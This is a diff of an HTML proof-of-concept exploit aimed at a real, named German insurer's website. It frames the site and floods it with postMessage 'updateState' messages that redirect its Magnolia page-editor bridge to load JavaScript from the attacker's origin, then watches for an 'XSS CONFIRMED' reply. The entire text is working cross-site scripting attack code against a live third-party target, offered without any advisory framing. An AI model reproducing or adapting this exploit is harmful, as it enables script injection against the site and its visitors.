@@ -2,54 +2,56 @@
 <html>
 <head><meta charset="utf-8"><title>PoC</title>
 <style>
-  body { font-family: monospace; background: #111; color: #eee; padding: 16px; margin: 0; }
-  #log { background: #1a1a1a; border: 1px solid #333; padding: 8px; margin-bottom: 10px; font-size: 12px; white-space: pre; }
-  iframe { display: block; width: 100%; height: 500px; border: 2px solid #555; }
+body { font-family: monospace; background: #0f0f0f; color: #eee; padding: 16px; margin: 0; }
+#status { background: #1a1a1a; border: 1px solid #444; padding: 10px; margin-bottom: 12px;
+          font-size: 12px; white-space: pre; max-height: 180px; overflow-y: auto; }
+.ok { color: #69db7c; } .err { color: #f38ba8; } .info { color: #89dceb; }
+iframe { display: block; width: 100%; height: 540px; border: 1px solid #444; }
 </style>
 </head>
 <body>
-<div id="log">Waiting...</div>
-<iframe id="f" src="https://www.condor-versicherungen.de/?mgnlPreview=false" width="100%" height="500"></iframe>
+<div id="status">Starting...</div>
+<iframe id="f" src="https://www.condor-versicherungen.de/?mgnlPreview=false"></iframe>
 <script>
-var log = document.getElementById("log");
-function addLog(msg) {
-  log.textContent += "\n" + new Date().toISOString().slice(11,19) + " " + msg;
+var s = document.getElementById("status");
+function log(msg, cls) {
+  s.innerHTML += '<span class="'+(cls||"info")+'">'+new Date().toISOString().slice(11,19)+' '+msg+'</span>\n';
+  s.scrollTop = s.scrollHeight;
 }
 
-var base = location.href.substring(0, location.href.lastIndexOf("/"));
+// base URL of this page (where payload.js lives)
+var base = location.href.replace(/\/[^\/]*$/, "");
 var serverUrl = base + "/.magnolia/x";
-var payload = JSON.stringify({ action: "updateState", serverUrl: serverUrl });
+var msg = JSON.stringify({ action: "updateState", serverUrl: serverUrl });
 
-addLog("Base URL: " + base);
-addLog("serverUrl: " + serverUrl);
-addLog("Waiting for iframe to load...");
+log("Attacker origin: " + base);
+log("serverUrl: " + serverUrl);
+log("Payload will load from: " + base + "/VAADIN/widgetsets/info.magnolia.PageEditor/info.magnolia.PageEditor.nocache.js");
 
-var fired = false;
-
-function sendPayload() {
-  if (fired) return;
-  addLog("Sending postMessage...");
-  try {
-    document.getElementById("f").contentWindow.postMessage(payload, "*");
-    addLog("postMessage sent OK");
-  } catch(e) {
-    addLog("ERROR: " + e);
+function attack() {
+  log("Starting attack: 80 messages × 500ms = 40s total", "ok");
+  for (var i = 0; i < 80; i++) {
+    (function(i) {
+      setTimeout(function() {
+        try {
+          document.getElementById("f").contentWindow.postMessage(msg, "*");
+          if (i % 10 === 0) log("msg #" + (i+1) + " sent...");
+        } catch(e) { log("ERROR: " + e, "err"); }
+      }, 400 + i * 500);
+    })(i);
   }
 }
 
-document.getElementById("f").onload = function() {
-  addLog("iframe onload fired — trying at 1s, 2s, 3s, 5s, 8s...");
-  // Retry multiple times — bridge may init slower than load event
-  [1000, 2000, 3000, 5000, 8000].forEach(function(d) {
-    setTimeout(sendPayload, d);
-  });
-};
+document.getElementById("f").addEventListener("load", function() {
+  log("iframe loaded", "ok");
+  attack();
+});
+setTimeout(attack, 1500); // also try before onload fires
 
-// Receive confirmation
 window.addEventListener("message", function(ev) {
   if (typeof ev.data === "string" && ev.data.indexOf("XSS:") === 0) {
-    fired = true;
-    addLog("✅ XSS CONFIRMED: " + ev.data);
+    log("✅ XSS CONFIRMED: " + ev.data, "ok");
+    document.body.style.background = "#0a2e0a";
   }
 });
 </script>
